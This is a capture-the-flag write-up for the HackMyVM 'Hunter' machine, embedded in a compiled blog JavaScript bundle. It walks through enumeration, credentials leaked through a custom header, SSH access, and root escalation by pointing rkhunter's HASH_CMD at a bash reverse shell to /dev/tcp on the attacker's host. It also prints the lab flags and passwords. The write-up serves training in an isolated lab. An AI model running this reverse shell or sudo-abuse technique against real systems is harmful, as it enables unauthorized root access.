"use strict";(globalThis.webpackChunkmy_own_blog=globalThis.webpackChunkmy_own_blog||[]).push([[5178],{96355(e,n,r){r.r(n),r.d(n,{assets:()=>l,contentTitle:()=>o,default:()=>h,frontMatter:()=>c,metadata:()=>t,toc:()=>a});const t=JSON.parse('{"id":"hack-my-vm/machines/hunter/hunter","title":"Hunter","description":"- Description: CTF. Have Fun.","source":"@site/docs/hack-my-vm/machines/hunter/hunter.mdx","sourceDirName":"hack-my-vm/machines/hunter","slug":"/hack-my-vm/machines/hunter/","permalink":"/docs/hack-my-vm/machines/hunter/","draft":false,"unlisted":false,"tags":[{"inline":false,"label":"Linux","permalink":"/docs/tags/linux","description":"Includes write-ups on the topic of Linux"},{"inline":false,"label":"Web","permalink":"/docs/tags/web","description":"Includes write-ups on the topic of Web"}],"version":"current","frontMatter":{"tags":["linux","web"]},"sidebar":"writeupsSidebar","previous":{"title":"Gift","permalink":"/docs/hack-my-vm/machines/gift/"},"next":{"title":"HMVLabs","permalink":"/docs/category/hmvlabs"}}');var s=r(74848),i=r(28453);const c={tags:["linux","web"]},o="Hunter",l={},a=[{value:"\ud83d\udd0e Solution",id:"-solution",level:2},{value:"\ud83d\udea9Flag",id:"flag",level:2}];function d(e){const n={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,i.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.header,{children:(0,s.jsx)(n.h1,{id:"hunter",children:"Hunter"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Description:"})," CTF. Have Fun."]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Difficulty:"})," Easy"]}),"\n"]}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"-solution",children:"\ud83d\udd0e Solution"}),"\n",(0,s.jsxs)(n.p,{children:["I started by running an Nmap scan against the target ",(0,s.jsx)(n.code,{children:"hunter"}),".\r\nThe scan revealed 2 open services: SSH on port ",(0,s.jsx)(n.code,{children:"22"})," and an HTTP server written in Golang running on port ",(0,s.jsx)(n.code,{children:"8080"}),"."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:'> nmap -sV 10.0.2.5    \r\n\r\nPORT     STATE SERVICE VERSION\r\n22/tcp   open  ssh     OpenSSH 10.0 (protocol 2.0)\r\n8080/tcp open  http    Golang net/http server\r\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\r\nSF-Port8080-TCP:V=7.95%I=7%D=11/21%Time=69201CF7%P=x86_64-pc-linux-gnu%r(G\r\nSF:etRequest,8A,"HTTP/1\\.0\\x20200\\x20OK\\r\\nDate:\\x20Fri,\\x2021\\x20Nov\\x202\r\nSF:025\\x2008:04:09\\x20GMT\\r\\nContent-Length:\\x2021\\r\\nContent-Type:\\x20tex\r\nSF:t/plain;\\x20charset=utf-8\\r\\n\\r\\nYes,\\x20thats\\x20a\\x20CTF\\x20:_\\(\\n")%\r\nSF:r(HTTPOptions,8A,"HTTP/1\\.0\\x20200\\x20OK\\r\\nDate:\\x20Fri,\\x2021\\x20Nov\\\r\nSF:x202025\\x2008:04:09\\x20GMT\\r\\nContent-Length:\\x2021\\r\\nContent-Type:\\x2\r\nSF:0text/plain;\\x20charset=utf-8\\r\\n\\r\\nYes,\\x20thats\\x20a\\x20CTF\\x20:_\\(\\\r\nSF:n")%r(RTSPRequest,67,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Typ\r\nSF:e:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x\r\nSF:20Bad\\x20Request")%r(FourOhFourRequest,8A,"HTTP/1\\.0\\x20200\\x20OK\\r\\nDa\r\nSF:te:\\x20Fri,\\x2021\\x20Nov\\x202025\\x2008:04:09\\x20GMT\\r\\nContent-Length:\\\r\nSF:x2021\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\n\\r\\nYes,\\x20t\r\nSF:hats\\x20a\\x20CTF\\x20:_\\(\\n")%r(Socks5,67,"HTTP/1\\.1\\x20400\\x20Bad\\x20Re\r\nSF:quest\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x\r\nSF:20close\\r\\n\\r\\n400\\x20Bad\\x20Request")%r(GenericLines,67,"HTTP/1\\.1\\x20\r\nSF:400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\\r\nSF:r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request")%r(Help,67,"HTTP/\r\nSF:1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charse\r\nSF:t=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request")%r(SSLSes\r\nSF:sionReq,67,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text\r\nSF:/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20R\r\nSF:equest")%r(LPDString,67,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-\r\nSF:Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n40\r\nSF:0\\x20Bad\\x20Request")%r(SIPOptions,67,"HTTP/1\\.1\\x20400\\x20Bad\\x20Reque\r\nSF:st\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20c\r\nSF:lose\\r\\n\\r\\n400\\x20Bad\\x20Request")%r(OfficeScan,A3,"HTTP/1\\.1\\x20400\\x\r\nSF:20Bad\\x20Request:\\x20missing\\x20required\\x20Host\\x20header\\r\\nContent-T\r\nSF:ype:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\r\nSF:\\x20Bad\\x20Request:\\x20missing\\x20required\\x20Host\\x20header");\r\nMAC Address: 08:00:27:57:2A:A6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n'})}),"\n",(0,s.jsxs)(n.p,{children:["Since port ",(0,s.jsx)(n.code,{children:"8080"})," was serving HTTP, I visited ",(0,s.jsx)(n.code,{children:"http://<IP-address>:8080/"}),".\r\nThe page only displayed a short message."]}),"\n",(0,s.jsx)("div",{style:{width:"100%",margin:"0 auto"},children:(0,s.jsx)("img",{src:r(67768).A,style:{width:"100%",height:"auto"}})}),"\n",(0,s.jsxs)(n.p,{children:["To explore hidden directories, I used ",(0,s.jsx)(n.code,{children:"feroxbuster"})," with a common wordlist and several file extensions."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:'feroxbuster -q -u "http://<IP-address>:8080/" -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,txt,html,zip,db,bak,js -t 64\n'})}),"\n",(0,s.jsx)(n.p,{children:"This returned multiple interesting paths:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"200      GET        1l        2w       13c http://10.0.2.5:8080/admin                                                                       \r\n200      GET        1l        5w       21c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter     \r\n200      GET        2l        4w       31c http://10.0.2.5:8080/robots.txt\r\n204      GET        0l        0w        0c http://10.0.2.5:8080/beacon\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Visiting ",(0,s.jsx)(n.code,{children:"/robots.txt"})," revealed restricted directory information:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"> curl http://10.0.2.5:8080/robots.txt\r\nUser-agent: *\r\nDisallow: /admin\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Accessing ",(0,s.jsx)(n.code,{children:"/admin"})," returned:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"> curl http://10.0.2.5:8080/admin\r\nInvalid JWT.\n"})}),"\n",(0,s.jsxs)(n.p,{children:["So I fired up ",(0,s.jsx)(n.strong,{children:"Burp Suite"}),", forwarded the request to Repeater, changed the request method from ",(0,s.jsx)(n.code,{children:"GET"})," to ",(0,s.jsx)(n.code,{children:"POST"}),"-and that triggered a response containing credentials in a custom header:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"X-Secret-Creds: hunterman:thisisnitriilcisi\n"})}),"\n",(0,s.jsx)("div",{style:{width:"100%",margin:"0 auto"},children:(0,s.jsx)("img",{src:r(92965).A,style:{width:"100%",height:"auto"}})}),"\n",(0,s.jsx)(n.p,{children:"These looked like valid SSH credentials-so I tested them:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"> ssh hunterman@10.0.2.5\r\nhunterman@10.0.2.5's password: \r\nWelcome to Alpine!\r\n\r\nThe Alpine Wiki contains a large amount of how-to guides and general\r\ninformation about administrating Alpine systems.\r\nSee <https://wiki.alpinelinux.org/>.\r\n\r\nYou can setup the system with the command: setup-alpine\r\n\r\nYou may change this message by editing /etc/motd.\r\n\r\nhunter:~$ whoami\r\nhunterman\n"})}),"\n",(0,s.jsx)(n.p,{children:"Inside the user's home directory, I found the first flag:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"hunter:~$ cat user.txt \r\nHMV{VcvaIKcezQVcvaIKcezQ}\n"})}),"\n",(0,s.jsx)(n.p,{children:"Since this machine was running a web service, I checked the typical hosting directory:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"hunter:/var/www/html$ ls\r\nadmin       beacon      index       robots.txt\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Opening ",(0,s.jsx)(n.code,{children:"robots.txt"})," here was much more interesting:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"hunter:/var/www/html$ cat robots.txt \r\nh u n t e r g i r l:fickshitmichini\n"})}),"\n",(0,s.jsx)(n.p,{children:"So I switched to the second user:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"hunter:~$ su huntergirl\r\nPassword: \r\n~ $ whoami\r\nhuntergirl\n"})}),"\n",(0,s.jsx)(n.p,{children:"Checking sudo privileges for this user revealed something useful:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"~ $ sudo -l\r\n...\r\nUser huntergirl may run the following commands on hunter:\r\n    (root) NOPASSWD: /usr/local/bin/rkhunter\n"})}),"\n",(0,s.jsxs)(n.p,{children:["At this point, privilege escalation became possible because ",(0,s.jsx)(n.code,{children:"rkhunter"})," can be exploited if its configuration is modified."]}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.code,{children:"rkhunter"})," (Rootkit Hunter) is a security tool used to detect malicious modifications, backdoors, and rootkits on Unix-like systems.\r\nIt performs integrity checks by comparing current system binaries with stored baseline values.\r\nOne of its configurable parameters is ",(0,s.jsx)(n.code,{children:"HASH_CMD"}),", which defines the command used for calculating file checksums. (",(0,s.jsx)(n.a,{href:"https://sources.debian.org/src/rkhunter/1.4.2-6%2Bdeb9u1/files/rkhunter.conf/",children:"Ref"}),")"]}),"\n",(0,s.jsx)("div",{style:{width:"70%",margin:"0 auto"},children:(0,s.jsx)("img",{src:r(22496).A,style:{width:"100%",height:"auto"}})}),"\n",(0,s.jsxs)(n.p,{children:["The key issue: if a user-controlled config file is loaded and ",(0,s.jsx)(n.code,{children:"HASH_CMD"})," is set to an arbitrary script, then whenever ",(0,s.jsx)(n.code,{children:"rkhunter"})," performs integrity checks, it will execute that script.\r\nAnd since the tool can be run as root without requiring a password (",(0,s.jsx)(n.code,{children:"sudo NOPASSWD"}),"), this becomes a privilege escalation vector.\r\nUsing the ",(0,s.jsx)(n.code,{children:"--configfile"})," argument allows execution with an alternate configuration, meaning the attacker can fully control ",(0,s.jsx)(n.code,{children:"HASH_CMD"})," execution."]}),"\n",(0,s.jsx)(n.p,{children:"So I created a reverse shell payload:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"~ $ echo 'bash -c \"/bin/bash -i >& /dev/tcp/10.0.2.15/8888 0>&1\"' > /tmp/script.sh\r\n~ $ chmod +x /tmp/script.sh\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Then I created a custom config file pointing ",(0,s.jsx)(n.code,{children:"HASH_CMD"})," to my script:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"~ $ cat > /tmp/myconf.conf << EOF\r\n> INSTALLDIR=/usr/local\r\n> SCRIPTDIR=/usr/local/lib/rkhunter/scripts\r\n> DBDIR=/var/lib/rkhunter/db\r\n> TMPDIR=/var/lib/rkhunter/tmp\r\n> HASH_CMD=/tmp/script.sh\r\n> SCRIPTWHITELIST=\r\n> EOF\n"})}),"\n",(0,s.jsx)(n.p,{children:"On my machine I prepared a listener:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"nc -lvnp 8888\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Then executed ",(0,s.jsx)(n.code,{children:"rkhunter"})," with root privileges using the modified config:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"~ $ sudo /usr/local/bin/rkhunter --propupd --configfile /tmp/myconf.conf\r\nThe default logfile will be used: /var/log/rkhunter.log\r\n[ Rootkit Hunter version 1.4.6 ]\n"})}),"\n",(0,s.jsx)(n.p,{children:"The listener received a connection-now with a root shell:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"> nc -lvnp 8888\r\nlistening on [any] 8888 ...\r\nconnect to [10.0.2.15] from (UNKNOWN) [10.0.2.5] 35288\r\nhunter:/home/huntergirl# \n"})}),"\n",(0,s.jsx)(n.p,{children:"With root access, I grabbed the final flag:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"hunter:~# cat root.txt\r\ncat root.txt \r\nHMV{FhOpuXDUlZFhOpuXDUlZ}\n"})}),"\n",(0,s.jsx)(n.h2,{id:"flag",children:"\ud83d\udea9Flag"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"User flag:"})}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.code,{children:"HMV{VcvaIKcezQVcvaIKcezQ}"})}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Root flag:"})}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.code,{children:"HMV{FhOpuXDUlZFhOpuXDUlZ}"})}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},92965(e,n,r){r.d(n,{A:()=>t});const t=r.p+"assets/images/burp-9676ebc2149a0c3d6495e47c076477b9.png"},22496(e,n,r){r.d(n,{A:()=>t});const t=r.p+"assets/images/hash-65daa59f02158e755fa5ce15911594aa.png"},67768(e,n,r){r.d(n,{A:()=>t});const t=r.p+"assets/images/web-25f85f89ea17f580b6f3af214be42e97.png"},28453(e,n,r){r.d(n,{R:()=>c,x:()=>o});var t=r(96540);const s={},i=t.createContext(s);function c(e){const n=t.useContext(i);return t.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:c(e.components),t.createElement(i.Provider,{value:n},e.children)}}}]);